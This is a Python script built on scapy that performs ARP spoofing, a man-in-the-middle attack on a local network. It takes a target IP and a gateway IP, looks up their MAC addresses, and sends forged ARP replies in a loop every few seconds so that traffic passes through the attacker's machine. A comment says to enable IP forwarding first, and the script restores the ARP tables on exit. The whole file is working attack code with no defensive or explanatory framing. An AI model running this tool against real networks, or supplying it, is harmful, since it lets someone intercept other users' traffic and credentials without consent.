import scapy.all
import optparse
import time

#first check your ip_forwarding is enable on your machine

def find_mac_address(ip):
    arp_request = scapy.all.ARP(pdst=ip)
    broadcast = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")
    answered_list = scapy.all.srp(broadcast/arp_request,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip,poisoned_ip):
    mac_address = find_mac_address(target_ip)
    arp_response = scapy.all.ARP(op=2,hwdst=mac_address,pdst=target_ip,psrc=poisoned_ip)
    #scapy.all.ls(scapy.all.ARP())
    scapy.all.send(arp_response,verbose=False)

def reset_func(target_ip,gateway_ip):
    mac_address = find_mac_address(target_ip)
    gateway_mac = find_mac_address(gateway_ip)
    arp_response = scapy.all.ARP(op=2,hwdst=mac_address,pdst=target_ip,psrc=gateway_ip,hwsrc=gateway_mac)
    #scapy.all.ls(scapy.all.ARP())
    scapy.all.send(arp_response,verbose=False,count=5)

def user_input():
    instance = optparse.OptionParser()
    instance.add_option("-t","--target",dest="target_ip",help="Enter target ip")
    instance.add_option("-g","--gateway",dest="gateway_ip",help="Enter gateway ip")
    options = instance.parse_args()[0]
    
    if not options.target_ip:
        print("Enter target ip")
    if not options.gateway_ip:
        print("Enter gateway ip")
    return options

step = 2
user_ips = user_input()

while True:
    try:
        arp_poisoning(user_ips.target_ip,user_ips.gateway_ip)
        arp_poisoning(user_ips.gateway_ip,user_ips.target_ip)
        print(f"\rSending package {step}",end="")
        time.sleep(3)
        step += 2
    except KeyboardInterrupt:
        print('\nquitting && reset')
        reset_func(user_ips.target_ip,user_ips.gateway_ip)
        reset_func(user_ips.gateway_ip,user_ips.target_ip)
        break